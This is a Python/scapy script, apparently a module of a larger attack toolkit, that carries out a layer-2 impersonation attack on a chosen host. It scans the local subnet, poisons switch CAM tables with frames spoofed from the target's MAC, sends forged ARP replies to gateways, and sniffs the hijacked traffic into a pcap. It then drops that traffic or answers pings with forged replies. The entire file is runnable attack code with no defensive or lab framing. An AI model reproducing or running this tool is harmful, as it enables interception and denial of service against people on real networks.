from scapy.all import *
import argparse
import time
import threading
import random
import os

def execute(args):
    """Execute data link impersonation attack"""
    print(f"[Impersonation] Starting attack on interface {args.interface}")
    
    try:
        target_ip = args.target_ip
        target_mac = args.target_mac
        attacker_ip = args.attacker_ip if args.attacker_ip else get_if_addr(args.interface)
        mode = args.mode if args.mode else "black_hole"
        
        if not target_mac and target_ip:
            print("[Impersonation] Target MAC not provided, attempting to discover...")
            target_mac = discover_target_mac(target_ip, args.interface)
            if not target_mac:
                print("[Impersonation] Could not discover target MAC, using random MAC")
                target_mac = RandMAC()
        
        print(f"[Impersonation] Target: {target_ip} ({target_mac})")
        print(f"[Impersonation] Attacker IP: {attacker_ip}")
        print(f"[Impersonation] Mode: {mode.upper()}")
        
        attack = DataLinkImpersonationAttack(
            interface=args.interface,
            target_mac=target_mac,
            target_ip=target_ip,
            attacker_ip=attacker_ip,
            mode=mode
        )
        
        if args.pcap:
            pcap_path = args.pcap if args.pcap != "default" else os.path.expanduser("~/Fyodost/impersonation.pcap")
            os.makedirs(os.path.dirname(pcap_path), exist_ok=True)
            attack.set_pcap_capture(pcap_path)
            print(f"[Impersonation] PCAP capture enabled: {pcap_path}")
        
        attack.start_attack()
        
        duration = args.duration if args.duration else 300
        print(f"[Impersonation] Running for {duration} seconds. Press Ctrl+C to stop early.")
        
        time.sleep(duration)
        
        attack.stop_attack()
        print("[Impersonation] Attack completed")
        
        return True
        
    except Exception as e:
        print(f"[Impersonation] Error: {e}")
        return False

def discover_target_mac(target_ip, interface):
    """Discover MAC address for target IP"""
    try:
        arp_request = ARP(pdst=target_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        answered = srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
        
        if answered:
            return answered[0][1].hwsrc
        return None
    except:
        return None

class DataLinkImpersonationAttack:
    def __init__(self, interface, target_mac, target_ip, attacker_ip, mode="black_hole"):
        self.interface = interface
        self.target_mac = target_mac
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.mode = mode
        self.attack_active = False
        self.threads = []
        self.pcap_writer = None
        
        self.attacker_mac = get_if_hwaddr(interface)
        
        self.packet_interval = 2.0
        self.burst_count = 5
        self.destinations = []
        self.infrastructure_targets = []
        
        self.cam_poison_packets = 0
        self.arp_poison_packets = 0
        self.intercepted_packets = 0
        self.dropped_packets = 0
        self.fake_responses = 0

    def set_pcap_capture(self, pcap_path):
        """Set up PCAP capture"""
        self.pcap_path = pcap_path
        self.pcap_writer = PcapWriter(pcap_path, append=True, sync=True)

    def start_attack(self):
        """Start the attack"""
        if self.attack_active:
            return
        
        self.attack_active = True
        
        print(f"\n[Impersonation] Starting attack")
        print(f"[Impersonation] Strategy: Poison CAM table to redirect {self.target_mac} traffic")
        
        self.scan_network_for_destinations()
        
        threads = [
            threading.Thread(target=self.cam_poisoning_loop, daemon=True),
            threading.Thread(target=self.arp_poisoning_loop, daemon=True),
            threading.Thread(target=self.traffic_interception_loop, daemon=True),
            threading.Thread(target=self.statistics_loop, daemon=True)
        ]
        
        for thread in threads:
            thread.start()
            self.threads.append(thread)

    def stop_attack(self):
        """Stop the attack"""
        if not self.attack_active:
            return
        
        self.attack_active = False
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        if self.pcap_writer:
            self.pcap_writer.close()
        
        print(f"\n[Impersonation] Attack summary:")
        print(f"CAM Poisoning Packets: {self.cam_poison_packets}")
        print(f"ARP Poisoning Packets: {self.arp_poison_packets}")
        print(f"Traffic Intercepted: {self.intercepted_packets}")
        print(f"Packets Dropped: {self.dropped_packets}")
        print(f"Fake Responses: {self.fake_responses}")

    def scan_network_for_destinations(self):
        """Scan network for CAM poisoning destinations"""
        try:
            interface_ip = get_if_addr(self.interface)
            ip_parts = interface_ip.split('.')
            network_range = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
            
            arp_request = ARP(pdst=network_range)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            answered = srp(arp_request_broadcast, timeout=2, verbose=False, iface=self.interface)[0]
            
            self.destinations = []
            for response in answered:
                client_ip = response[1].psrc
                client_mac = response[1].hwsrc
                
                if client_ip != self.attacker_ip and client_ip != self.target_ip:
                    self.destinations.append({"ip": client_ip, "mac": client_mac})
                    print(f"[Impersonation] Found host: {client_ip} ({client_mac})")
            
            self.destinations.append({"ip": "255.255.255.255", "mac": "ff:ff:ff:ff:ff:ff"})
            
            self.identify_infrastructure_targets()
            
        except Exception as e:
            print(f"[Impersonation] Network scan failed: {e}")
            self.destinations = [
                {"ip": "255.255.255.255", "mac": "ff:ff:ff:ff:ff:ff"},
                {"ip": "192.168.1.1", "mac": "00:00:00:00:00:01"},
            ]

    def identify_infrastructure_targets(self):
        """Identify network infrastructure targets"""
        self.infrastructure_targets = []
        
        interface_ip = get_if_addr(self.interface)
        ip_parts = interface_ip.split('.')
        
        potential_gateways = [
            f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1",
            f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.254",
            f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.100"
        ]
        
        for gw_ip in potential_gateways:
            for dest in self.destinations:
                if dest["ip"] == gw_ip:
                    self.infrastructure_targets.append({
                        "ip": gw_ip,
                        "mac": dest["mac"],
                        "type": "Gateway"
                    })
                    print(f"[Impersonation] Found gateway: {gw_ip} ({dest['mac']})")
                    break

    def cam_poisoning_loop(self):
        """CAM table poisoning loop"""
        print("[Impersonation] Starting CAM poisoning")
        
        while self.attack_active:
            try:
                for _ in range(self.burst_count):
                    if not self.attack_active:
                        break
                    
                    if self.destinations:
                        dest = random.choice(self.destinations)
                        self.send_cam_poisoning_packet(dest["mac"], dest["ip"])
                    
                    time.sleep(0.2)
                
                time.sleep(self.packet_interval)
                
            except Exception as e:
                print(f"[Impersonation] CAM poisoning error: {e}")

    def send_cam_poisoning_packet(self, dst_mac, dst_ip):
        """Send CAM poisoning packet"""
        try:
            packet = (
                Ether(src=self.target_mac, dst=dst_mac) /
                IP(src=self.target_ip, dst=dst_ip) /
                ICMP()
            )
            
            sendp(packet, iface=self.interface, verbose=False)
            self.cam_poison_packets += 1
            
            if self.cam_poison_packets % 10 == 0:
                print(f"[Impersonation] CAM packets sent: {self.cam_poison_packets}")
                
        except Exception as e:
            print(f"[Impersonation] Error sending CAM packet: {e}")

    def arp_poisoning_loop(self):
        """ARP poisoning loop"""
        print("[Impersonation] Starting ARP poisoning")
        
        while self.attack_active:
            try:
                for target in self.infrastructure_targets:
                    if not self.attack_active:
                        break
                    
                    self.send_arp_poison_packet(target)
                    time.sleep(0.1)
                
                time.sleep(self.packet_interval * 2)
                
            except Exception as e:
                print(f"[Impersonation] ARP poisoning error: {e}")

    def send_arp_poison_packet(self, target):
        """Send ARP poisoning packet"""
        try:
            arp_reply = (
                Ether(src=self.attacker_mac, dst=target["mac"]) /
                ARP(
                    op=2,
                    hwsrc=self.attacker_mac,
                    psrc=self.target_ip,
                    hwdst=target["mac"],
                    pdst=target["ip"]
                )
            )
            
            sendp(arp_reply, iface=self.interface, verbose=False)
            self.arp_poison_packets += 1
            
        except Exception as e:
            print(f"[Impersonation] Error sending ARP packet: {e}")

    def traffic_interception_loop(self):
        """Traffic interception loop"""
        print("[Impersonation] Starting traffic interception")
        
        try:
            sniff(
                iface=self.interface, 
                filter=f"ether dst {self.target_mac}", 
                prn=self.handle_intercepted_packet,
                stop_filter=lambda x: not self.attack_active,
                store=0
            )
        except Exception as e:
            print(f"[Impersonation] Traffic interception error: {e}")

    def handle_intercepted_packet(self, packet):
        """Handle intercepted packet"""
        if not self.attack_active:
            return
        
        self.intercepted_packets += 1
        
        if self.pcap_writer:
            self.pcap_writer.write(packet)
        
        print(f"[Impersonation] Intercepted packet #{self.intercepted_packets}")
        
        if self.mode == "black_hole":
            self.dropped_packets += 1
            print("[Impersonation] Packet dropped (black hole)")
        elif self.mode == "white_hole":
            self.send_fake_response(packet)

    def send_fake_response(self, packet):
        """Send fake response (white hole mode)"""
        try:
            if packet.haslayer(ICMP) and packet[ICMP].type == 8:
                response = (
                    Ether(src=self.target_mac, dst=packet[Ether].src) /
                    IP(src=packet[IP].dst, dst=packet[IP].src) /
                    ICMP(type=0, code=0, id=packet[ICMP].id, seq=packet[ICMP].seq) /
                    packet[ICMP].payload
                )
                
                sendp(response, iface=self.interface, verbose=False)
                self.fake_responses += 1
                print("[Impersonation] Sent fake ICMP response")
                
        except Exception as e:
            print(f"[Impersonation] Error sending fake response: {e}")

    def statistics_loop(self):
        """Statistics reporting loop"""
        while self.attack_active:
            time.sleep(15)
            if self.attack_active:
                print(f"\n[Impersonation] Statistics:")
                print(f"CAM Packets: {self.cam_poison_packets}")
                print(f"ARP Packets: {self.arp_poison_packets}")
                print(f"Intercepted: {self.intercepted_packets}")
                print(f"Dropped: {self.dropped_packets}")
                print(f"Fake Responses: {self.fake_responses}")

def add_arguments(parser):
    """Add impersonation attack specific arguments to parser"""
    parser.add_argument("--target-ip", "-ti", required=True, help="Target IP address")
    parser.add_argument("--target-mac", "-tm", help="Target MAC address")
    parser.add_argument("--attacker-ip", "-ai", help="Attacker IP address")
    parser.add_argument("--mode", choices=["black_hole", "white_hole"], 
                       default="black_hole", help="Attack mode")
    parser.add_argument("--duration", "-d", type=int, help="Attack duration in seconds")
    parser.add_argument("--pcap", help="PCAP file path for capture (default: ~/Fyodost/impersonation.pcap)")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Data Link Impersonation Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--target-ip", "-ti", required=True, help="Target IP address")
    parser.add_argument("--target-mac", "-tm", help="Target MAC address")
    parser.add_argument("--attacker-ip", "-ai", help="Attacker IP address")
    parser.add_argument("--mode", choices=["black_hole", "white_hole"], 
                       default="black_hole", help="Attack mode")
    parser.add_argument("--duration", "-d", type=int, default=300, help="Attack duration in seconds")
    parser.add_argument("--pcap", help="PCAP file path for capture")
    
    args = parser.parse_args()
    execute(args)